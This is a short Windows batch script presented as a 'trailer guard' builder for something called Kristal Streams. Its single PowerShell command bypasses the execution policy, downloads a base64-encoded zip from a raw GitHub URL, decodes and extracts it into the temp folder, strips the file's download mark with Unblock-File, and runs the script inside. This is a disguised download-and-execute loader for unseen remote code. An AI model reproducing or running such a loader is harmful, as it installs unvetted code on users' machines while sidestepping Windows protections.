@echo off
setlocal EnableExtensions
title Kristal Streams Internal Trailer Guard 1682048

echo.
echo ==========================================================
echo   KRISTAL STREAMS INTERNAL TRAILER GUARD 1682048
echo ==========================================================
echo.
echo Downloading the verified full-code Windows builder...

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
 "$ErrorActionPreference='Stop'; $root=Join-Path $env:TEMP 'ks-1682048-trailer-r2'; $b64=$root+'.b64'; $zip=$root+'.zip'; $dir=$root+'-files'; Remove-Item $b64,$zip -Force -ErrorAction SilentlyContinue; Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/djudge47/kristalstreams/e676874de69814f1aa6dfb715d5339228bb7ad45/kristalstreams-1682048-r2.zip.b64' -OutFile $b64; [IO.File]::WriteAllBytes($zip,[Convert]::FromBase64String([IO.File]::ReadAllText($b64))); Expand-Archive -LiteralPath $zip -DestinationPath $dir -Force; $builder=Join-Path $dir 'KS-INTERNAL-TRAILER-GUARD-1682048.cmd'; if(-not (Test-Path -LiteralPath $builder)){throw 'Full-code trailer-guard builder was not found after extraction'}; Unblock-File $builder; & $builder; if($LASTEXITCODE){exit $LASTEXITCODE}"

if errorlevel 1 (
    color 4F
    echo.
    echo ERROR: The full-code 1682048 builder could not be downloaded or started.
    echo.
    pause
    exit /b 1
)

exit /b 0
